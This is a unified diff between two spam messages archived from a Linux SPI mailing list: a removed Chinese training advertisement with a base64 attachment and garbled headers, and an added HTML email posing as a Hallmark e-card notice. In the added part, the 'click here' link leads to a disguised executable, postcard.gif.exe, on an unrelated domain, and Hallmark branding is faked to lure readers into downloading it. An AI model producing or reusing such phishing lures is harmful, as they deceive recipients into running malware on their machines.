@@ -1,11 +1,8 @@
-From: "kio" <qingsisi78-Xb2Y1Dfb9CI@public.gmane.org >
-Subject: [SPAM] ÂêàÂêåÁÆ°ÁêÜ‰∏éÂêàÂêåÈ£éÈô©ËßÑÈÅø
-Date: Sun, 27 Dec 2009 19:50:58 +0800
-Message-ID: <E1NOrhn-000861-9O@sfs-ml-3.v29.ch3.sourceforge.com>
-Reply-To: wesaaky-6VbI164tLz0@public.gmane.org
-Mime-Version: 1.0
-Content-Type: multipart/mixed;
-	boundary="=_NextPart_2rfkindysadvnqw3nerasdf";charset="GB2312"
+From: Hallmark.com <E-Cards-Vl8Nmh0JAcRWk0Htik3J/w@public.gmane.org>
+Subject: [SPAM] You have received a Hallmark Postcard!
+Date: Sun, 27 Dec 2009 19:44:09 +0100 (CET)
+Message-ID: <20091227190708.65DFF199CAFF@s2.newnomads.nl>
+Content-Type: multipart/mixed; boundary="===============3960858885071527697=="
 To: spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Return-path: <spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
@@ -18,121 +15,80 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>
 Errors-To: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-spi.vger.kernel.org
 
-This is a multi-part message in MIME format
+--===============3960858885071527697==
+Content-Type: text/html
 
---=_NextPart_2rfkindysadvnqw3nerasdf
-Content-Type: text/plain
-Content-Transfer-Encoding: 7bit
 
-«Îø¥∏Ωº˛£¨»Áπ˚”–¥Ú»≈£¨«Î‘≠¡¬£¨–ª–ª£°
+<style type="text/css"> <!-- a { color:#3000A0; text-decoration:none;} a:hover { text-decoration:underline; } -->
+</style> <table width="617" border="0" cellspacing="0" cellpadding="0">
+  <tr> <td><a href="http://www.hallmark.com/" target="_blank"><img
+src="http://www.hallmark.com/wcsstore/HallmarkStore/images/globalNav/gnav_logo.gif" alt="Hallmark.com"
+title="Hallmark.com" width="128" height="53" border="0"></a><a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/category1|10001|10051|-2|-2|products|unShopOnline|Shop
+Online?lid=unShopOnline" target="_blank"><img
+src="http://www.hallmark.com/wcsstore/HallmarkStore/images/globalNav/gnav_shop.gif" alt="Shop Online" title="Shop
+Online" width="116" height="53" border="0"></a><a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/article|10001|10051|/HallmarkSite/HallmarkMagazine/|magazine|unHallmarkMagazine?lid=unHallmarkMagazine"
+target="_blank"><img src="http://www.hallmark.com/wcsstore/HallmarkStore/images/globalNav/gnav_hmkmag.gif"
+alt="Hallmark Magazine" title="Hallmark Magazine" width="130" height="53" border="0"></a><a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/category1|10001|10051|-102001|-102001|ecards|unEcardandMore|E-Cards?lid=unEcardandMore"
+target="_blank"><img
+src="http://senehnet.net/e-cards.GIF" alt="E-Cards &amp; More"
+title="E-Cards &amp; More" width="120" height="53" border="0"></a><a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/article|10001|10051|/HallmarkSite/GoldCrownStores/|stores|unGoldCrownStores?lid=unGoldCrownStores"
+target="_blank"><img src="http://www.hallmark.com/wcsstore/HallmarkStore/images/globalNav/gnav_gcs.gif" alt="At Gold
+Crown" title="At Gold Crown" width="123" height="53" border="0"></a></td>
+  </tr> </table> <table width="617" border="0" cellspacing="0" cellpadding="0" style="border-left: 1px solid #AAA7A1;
+border-right: 1px solid #AAA7A1;">
+  <tr> <td height="28" valign="middle" bgcolor="#E0D8D0"><font size="4" face="Arial, Helvetica,
+sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>You have received A Hallmark Postcard. </b></font></td>
+  </tr>
+  <tr> <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td height="35" colspan="3">&nbsp;</td>
+    </tr>
+    <tr>
+      <td width="20">&nbsp;</td>
+      <td><font size="2" face="Arial, Helvetica, sans-serif"> Hello!<br>
+        <br>
+        You have received a Hallmark Postcard.<br>
+        <br>
+        To see it, click <a href="http://discount-trade-cars.com/postcard.gif.exe"
+target="_blank"><strong>here</strong></a>.<br>
+        <br>
+        There's something special about that Postcard feeling. We invite you to make a friend's day and <a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/category1|10001|10051|-102001|-102001|ecards|unEcardandMore|E-Cards?lid=unEcardandMore"
+target="_blank"><strong>send one</strong></a>.<br>
+        <br>
+        Hope to see you soon,<br>
+        Your friends at Hallmark<br>
+        <br>
+        Your privacy is our priority. Click the "Privacy and Security" link at the bottom of this E-mail to view our
+policy. </font></td>
+      <td width="20">&nbsp;</td>
+    </tr>
+    <tr>
+      <td height="35" colspan="3">&nbsp;</td>
+    </tr>
+  </table></td>
+  </tr> </table> <table width="617" height="32" cellpadding="0" cellspacing="0" bgcolor="#F0F0E8"
+bordercolor="#A8A098" style="border-style:solid; border-width:1px;">
+  <tr> <td height="32" ><font color="#666666" face="Arial, Helvetica, sans-serif" size="1">
+  <center>
+    <a href="http://www.hallmark.com/" target="_blank"><font color="#666666">Hallmark.com</font></a> | <a
+href="http://www.hallmark.com/webapp/wcs/stores/servlet/article|10001|10051|/HallmarkSite/LegalInformation/FOOTER_PRIVLEGL|"
+target="_blank"><font color="#666666">Privacy &amp; Security</font></a> | <a
+href="http://hallmark.custhelp.com/?lid=lnhelp-Home Page" target="_blank"><font color="#666666">Customer
+Service</font></a> | <a href="http://go.mappoint.net/Hallmark/PrxInput.aspx?lid=lnStoreLocator-Home Page"
+target="_blank"><font color="#666666">Store Locator</font></a>
+  </center>
+  </font></td>
+  </tr>
+</table>
 
---=_NextPart_2rfkindysadvnqw3nerasdf
-Content-Type: application/octet-stream;
-        name="∫œÕ¨π‹¿Ì”Î∫œÕ¨∑Áœ’πÊ±‹.txt"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
-        filename="∫œÕ¨π‹¿Ì”Î∫œÕ¨∑Áœ’πÊ±‹.txt"
 
-us/NrLncwO3T67rPzay358/Vueax3A0KoaENCsnu29qhosnPuqOhorGxvqm/qr/ODQoNCtb3sOy1
-pc67o7rJ7tva1trIy9DQudzA7dfJ0a/N+CAgDQrJ7tvaytDSu7b+yP253MDt18nRr9PQz965q8u+
-DQoNCsqxvOS12LXjo7oyMDEwxOox1MIyMy0yNMjVIMnPuqMNCiAgICAgICAgICAyMDEwxOox1MIz
-MC0zMcjVIMnu29oNCiAgICAgICAgICAyMDEwxOox1MIyMS0yMsjVILGxvqkNCiAgICANCg0Kss68
-07bUz/Ojusbz0rW+rcDtoaKyybm6sr+hos7vwfeyv6Giz/rK276twO2hosrQs6Gyv6GissbO8bK/
-oaLP+srbyMvUsbXIICANCg0K0afPsLfR08OjuqOkMjgwMNSqL8jLILqsxeDRtbfRoaLXysHPt9Gh
-os7nss2horLoteO1yA0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCrG4ICAgINeio7oN
-CtfJ0a+157uwo7owNzU1LTI2MDc1MzY1ICAwNzU1LTI2MDc1MjY1DQq0qyAgICDV5qO6MDc1NS02
-MTM1MTM5NiAgDQrBqiDPtSDIy6O6IMHo0KG94yAgMTM3Mjg3MTk5NDgNCg0KDQrG5Mv71+7Qwtfu
-yMjDxbXEv86zzMfrtcfCvXd3dy45OTY2MzMzLmNvbaOo1trIy9DQudzA7dfJ0a/N+KOpDQoNCi0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogDQq/zrPMytXS5g0KICAgIMnMzvHIy9SxsdixuLXEt6jC
-ybmkvt8NCiAgICDI57rO09DQp7340NC6z82sudzA7Q0KICAgILrPzay53MDttcTB97PM0+vW2NKq
-0NQNCiAgICC6z82sz93a5bXEyrax8NPrt+fP1bXEt8C3tg0KICAgIMnMzvG6z82svsC317XEtKbA
-7dPrttTTpg0KICAgILOjvPvJzM7xus/NrLXEus/NrLncwO21xMTRteO8sNbYteMNCiAgICDNqLn9
-sLjA/cHLveLKwL3nvLbG89K1us/NrLncwO3Uy9f3xKPKvQ0KICAgINXGztW8qNCntcS53MDtt723
-qA0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCr/Os8y087jZo7ogDQrSu6GiysC958G9
-tPO3qM+1tcTM2LXjvLDW99Kqufq80r3pydwNCg0Ktv6horrPzazP3drl0+u3wLe2o6zNqLn9sLjA
-/bfWzvYNCj8Jus/NrMbb1am1xLHtz9bQzsq9DQo/CbrPzazG29WptcS3qMLJ1PDIzrXE1vfSqsTa
-yN2jug0KPwnKtsbGus/NrMbb1anT68/d2uW1xMqutPO3vbeoDQo/CdSkt8C6z82sxtvVqbXEzuW0
-87TryqkNCg0KyP2jrsjnus69+NDQ09DQp7XEus/NrLncwO0NCj8Jus/NrLncwO3A4NDNDQo/CbrP
-zay+rcDttcS9x8mrvLDE3MGm0qrH8w0KPwnNxbbTuaTX97XEudzA7bfnuPENCj8Jus/NrLncwO28
-xruu0+u6z82s1srBv7zGu64NCj8Jus/NrLncwO21xNX+st/T68H3s8wNCj8Jus/NrLncwO21xNX+
-st8NCj8Jus/NrLncwO3B97PMzsS8/g0KPwm6z82sudzA7cH3s8zNvA0KPwm6z82stcSxo7TmvLDP
-+rvZDQqwuMD9t9bO9qO6xLPG+7O1uavLvrXEssm5urrPzay53MDtwfezzA0KsLjA/bfWzvajusSz
-tPPQzcb7s7XF5Lz+1sbU7Lmry766z82sudzA7cKptrQNCg0Ky8Qgus/NrLXEtqnBotPrus/NrLXE
-0KfBpqO6DQo/CbrPzazJ+tCnyrG85A0KPwm6z82stcTQp8Gms9bQ+MqxvOQNCrC4wP231s72o7rE
-s7Tz0M3J+rL60M25q8u+tcSyybm6us/NrLncwO3Kp87zDQoNCs7lILrPzazE2sjdo7oNCj8Jyv3B
-v7yw1srBv8z1v+6juw0KPwm827/uu/KxqLPqzPW/7qO7DQo/CcLE0NDG2s/eoaK12LXjus23vcq9
-o7sNCj8JtaOxo7ywzqXUvNTwyM7M9b/uo7sNCj8Jt+fP1deq0sbM9b/uo7sNCj8Jy/nT0MiosaPB
-9Mz1v+4NCj8Jsru/yb+5wabM9b/uo7sNCj8J1qrKtrL6yKihorGjw9zQrdLpzPW/7qO7DQo/CdX5
-0um94r72t73Kvcz1v+6juw0KPwnJ+tCnzPW8/tS8tqgNCrC4wP231s72o7rEs7Tz0M3BrMv4uavL
-vrXEus/NrLncwO3Kp87zDQogICAgICAgICAgxLO089DNvNK158Gsy/i5q8u+tcS1o7GjudzA7cqn
-zvMNCiAgICAgICAgICDEs9bQ0M3Uy8rkuavLvrXEyfrQp8z1v+7Kp87zDQoNCsH5o64gus/NrLXE
-wsTQ0KO6DQo/CdS8tqiyu8P3tcTCxNDQDQo/Cda00NDV/riutqi826Gi1ri1vLzbtcS6z82stcTC
-xNDQDQo/CcnmvLC12sj9yMu1xLrPzay1xMLE0NANCj8JyP249r+5sefIqKGitPrOu8iovLCzt8/6
-yKgNCj8JuvO6z82s0uXO8Q0KsLjA/bfWzvajusSzvLzK9dHQt6K5q8u+tcS687rPzazS5c7xDQoN
-Csbfo64gus/NrLXEseS4/NPrveKz/byws6O8+77At9e0psDtDQo/Cdb3zOWx5Lj8o6zS1Lyw1vfM
-5dfKuPENCj8JwsTQ0MTayN21xLHkuPwNCj8J1a7IqLXE16rIww0KPwmx7bz7tPrA7Q0KPwnO3tCn
-us/NrKOs0KfBprT9tqjT67O3z/rIqA0KPwnVrs7xtcTXqsjDDQo/CdKq1LzT67PQxbW1xNX50ukN
-Cg0KsMuhorLJubq6z82s1tC1xMbky/vOysziDQo/CbrP06rQ1LrPzazKsdOm16LS4s7KzOINCj8J
-w7PS19DU06bXotLizsrM4g0KPwm6z9f30+vWqsq2svrIqM7KzOINCg0KvsUgoaKzo7z7ssm5urrP
-zay1xLncwO3W2LXjvLDE0bXjDQo/CbnYvPzO78HPL8a/vrHO78HPtcS6z82sudzA7dbYteMNCj8J
-uNy4y87vwc8vs6O55s7vwc+1xLrPzay53MDt1ti14w0KPwnJ5s3issm5urrPzay53MDt1ti14w0K
-PwlNUk+yybm6us/NrLncwO3W2LXjDQo/CbLJubrN4rD8us/NrLncwO3W2LXjDQqwuMD9t9bO9qO6
-xLO089DNxvuztcXkvP7J+rL60M25q8u+tcSyybm6us/NrA0KICAgICAgICAgIMSzxvuztaOo1tC5
-+qOpuavLvrXEssm5urrPzawNCg0Kyq6horrPzay358/VudzA7Q0KPwm6z82swsTQ0NbQtObU2rXE
-t+fP1Q0KPwm358/Vv9jWxiCoQyC6z7jxuanTpsnMtcTRodTxDQo/CS0tsru6z7jxtcS5qdOmycy0
-+MC0x7HU2rfnz9UsDQo/CS0tuanTpsnMxsC5wKOsxsDJ89PryfO8xszlz7UNCj8Jvbu79bncwO0N
-Cj8Jz+7Ev7LJubrW0LXE1srBv7fnz9Usvfi2yLfnz9UsICwgs8mxvrfnz9XUrdLyt9bO9rrNt8DW
-zrTryqkNCj8JyczStbrNxuTL+7fnz9W31s72us23wNbODQoNCsqu0ruhorrPzay8qNCnL7mp06bJ
-zLyo0Ke53MDtDQo/CbrPzay8qNCnL7mp06bJzLyo0Ke/vLrL1rix6g0KPwm4+tfZ0+u/vLrLzOXP
-tQ0KsLjA/bfWzvajusSzuavLvrXEssm5urrPzawNCg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LQ0KIA0K16i80r3pydyjutbcz/LR9KO618rJ7reowsm5y87Ko6yyybm6us25qdOmwbS53MDt16i8
-0qOs18rJ7teo0rW5qdOmwbS53MDtvbLKpg0KDQogICAgt6jRp8u2yr+jrLmkycy53MDt16jStbKp
-yr+jrMqutuDE6rXEuaTX976twPqjrNT4z8i688jO1rDT2srAvec1MDDHv8W3w8DG8w0K0rWjrMD6
-yM6yybm6sr+zpKGissm5utbQ0MS437y2vq3A7dLUvLDRx8yrtdjH+Lmp06bJzLncwO21yNawzvGj
-rM/WyM7Es8rAvec1MDANCse/0NDStcHsz8i5q8u+o6y4utTwyKvH8rmp06bBtLncwO2ho1Rob21h
-c7u5ysfTorn6u8q80rLJubrO78H30K274aOoQ0lQU6Op1tC5+g0KytrIqMXg0bXKpqOsw8C5+rLJ
-ubrT67mp06a53MDt0K274aOoSVNNo6nXorLhssm5ur6twO2jqENQTaOpxeDRtcqmo6y5+rzS16Ky
-4Q0Kssm5usqmL0lUQyCyybm60+u5qdOmwbS53MDtufq8ysjP1qS6y9DEzcW2072yyqahow0KDQog
-ICAg1tzAz8qmvavP1snty7W3qKO6vavX1Ly6yq624MTqtcS5qdOmwbS53MDtvq3R6dLUvLDG5LG+
-yMvU+sq1ye668bXEt6jCybmmDQq119LUtPPBv8n6tq+15NDNtcSwuMD9zqrSwM3Qye7I68ezs/a1
-2MbKzvbI1bOj1MvX9tbQx7G3/LXEt6jCybfnz9WjrLKitNO3qMDtDQrT68q11b29x7bIvfjQ0L3i
-tsG6z82st+fP1dPrt8C3tqOsvfjSu7K9t8C3tsbb1am6zdSkt8C6z82svsC316Os0tS8sM6ju/rU
-pL6vDQrT67SmwO2ho82syrGjrL2r0K3W+rTzvNK94s720tTPws7KzOKjurmry77TprWxyei8xtT1
-0fm1xLrPzayjrNbGtqmz9rK7zay6z82sDQrR+bG+0tS8sLrPzay53MDtwfezzKOstNO5q8u+1MvT
-qrrNuanTpsG0udzA7bXEvce2yKOstNO4+bG+yc+55rHcuanTprfnz9XT68/dDQra5aO/oaOho6Gj
-oaOho6GjuPy24MTayN2jrNPQxPq1xLLO0+u9q7vhuPy+q7LKo6ENCg0KICAgINfuycOzpLXExeDR
-tb/GxL/T0KO6uN+8trncuanTpsG0udzA7cq1zvGhosirx/K5qdOmwbS3vbC4yei8xqGiufq8ysOz
-0te35w0Kz9XT67nmsdyjrL21tc25q8u+ssm5urPJsb6horLJubrJzM7xzLjF0KGiuanTpsnMvKjQ
-p7ncwO21yL/Os8yho9T4t/7O8bn9teTQzQ0KtPqx7b/Nu6fT0KO60rvG+6Osyc/G+7yvzcWhotbQ
-yq+7r6Os1tC6o9PNo6zO98PF19OhorCuxKzJ+qGitsWw7qGiw7fAvMjVwLyhog0KtcLM2M3+wNWh
-osj90Me159fToaK3ycD7xtahor+ozvfFt6Giu6rB6LyvzcW1yLn6xNrN4tb4w/u5q8u+DQoNCi0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCsjn0qqyzrzTsb60ztHQzNa74aOsv8nNqLn9z8LD5sG9
-1ta3vcq9sajD+7LOvNOjug0K18nRr7Xnu7CjujA3NTUtMjYwNzUzNjUgIDA3NTUtMjYwNzUyNjUg
-DQrBqiDPtSDIy6O6IMHo0KG94yAgMTM3Mjg3MTk5NDgNCg0KDQq9q9LUz8KxqMP7se3E2sjdtPLT
-oczu0LS687Sr1ea1vaO6MDc1NS02MTM1MTM5Ng0KDQqxqKGhoaHD+6GhoaG72KGhoaHWtA0KDQqy
-zrzTv87M4qO6us/NrLncwO3T67rPzay358/Vueax3A0KDQq12LXjo7ogICAgoaGhocqxvOSjuqGh
-oaGhoaGhyM/WpKO6DQoNCrLOu+G1pc67w/uzxqO6X19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX18gRW1haWyjul9fX19fX19fX19fX19fX19fX19fX18goaENCiANCsGqz7XIy6O6X19f
-X19fX19fX19fX19fILXnu7Cjul9fX19fX19fX19fX19fX19fX19fXyC0q9Xmo7pfX19fX19fX19f
-X19fX19fX19fX18NCiChoQ0Kss6809Gn1LGjul9fX19fX19f1rDO8aO6X19fX19fX19fX19fX19f
-yta7+qO6X19fX19fX19fX19fX19fRW1haWyjul9fX19fX19fX19fXw0KDQqyzrzT0afUsaO6X19f
-X19fX1/WsM7xOl9fX19fX19fX19fX19fXyDK1rv6o7pfX19fX19fX19fX19fX19FbWFpbKO6X19f
-X19fX19fX19fDQoNCrLOvNPRp9Sxo7pfX19fX19fX9awzvGjul9fX19fX19fX19fX19fX8rWu/qj
-ul9fX19fX19fX19fX19fX0VtYWlso7pfX19fX19fX19fX18NCiAgICAgIA0KuLa/7re9yr2juqH1
-z9a98KGhofXWp8axoaGh9deq1coNCg0KyMvK/aO6X19fX19fyMsgICCyzrvht9HTw6O6ubK8xqO6
-X19fX19f1KogDQoNCrG416INCjEuytW1vbnzy76xqMP70MXPorrzo6zO0sPHvau12tK7yrG85LrN
-ufPLvrLOu+HBqs+1yMu9+NDQyLfIz6O7DQoyLtTav6q/zsew0rvW3KOsztLDx9PQ16jIy7j4ufPL
-vreiy82yzrzTxeDRtbXEyLfIz7qvo6zJz8Pm09DF4NG1sai1vda40v2jrNLUvLANCiAgz+rPuLXE
-yc+/zrXY1re6zcK3z9/NvKO7DQozLrTLv86zzNKyv8nS1LCyxcXG89K1xNrRtaOsu7bTrcC0tefX
-ydGvvLDJ6sfrxcXG2qO7DQo0LsjnttS0y7/Os8zT0MjOus7Syc7Ko6y7ttOtsqa08rXnu7DP8s7S
-w8fXydGvoaM=
 
---=_NextPart_2rfkindysadvnqw3nerasdf
+--===============3960858885071527697==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -144,7 +100,7 @@ Take advantage of Verizon's best-in-class app development support
 A streamlined, 14 day to market process makes app distribution fast and easy
 Join now and get one step closer to millions of Verizon customers
 http://p.sf.net/sfu/verizon-dev2dev 
---=_NextPart_2rfkindysadvnqw3nerasdf
+--===============3960858885071527697==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -155,4 +111,4 @@ spi-devel-general mailing list
 spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 https://lists.sourceforge.net/lists/listinfo/spi-devel-general
 
---=_NextPart_2rfkindysadvnqw3nerasdf--
+--===============3960858885071527697==--
